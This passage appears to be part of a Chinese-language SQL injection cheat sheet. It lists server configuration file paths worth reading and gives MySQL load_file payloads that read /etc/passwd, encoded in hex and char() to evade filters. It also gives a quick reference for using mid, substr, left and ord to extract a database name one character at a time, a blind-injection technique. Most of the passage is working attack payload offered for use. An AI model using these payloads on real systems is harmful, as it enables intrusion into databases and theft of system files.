/usr/local/resin-pro-3.0.22/conf/resin.conf 同上

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看

/etc/sysconfig/iptables 查看防火墙策略

load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录0

replace(load_file(0×2F6574632F706173737764),0×3c,0×20)

replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
```



## 快查手册



截取函数，mid，substr，left



```
str("123456")

mid(str,2,1)	结果为2
```



```
mid(database(),1,1)
mid(database(),2,1)
...
```

依次查看数据库的每一位字符



```
substr(database(),1,1)

作用一样
```



```
left(database(),1)
left(database(),2)
left(database(),3)
...

从左至右依次查看每一位字符
```



```
ord()
返回第一个字符的ASCII码
```

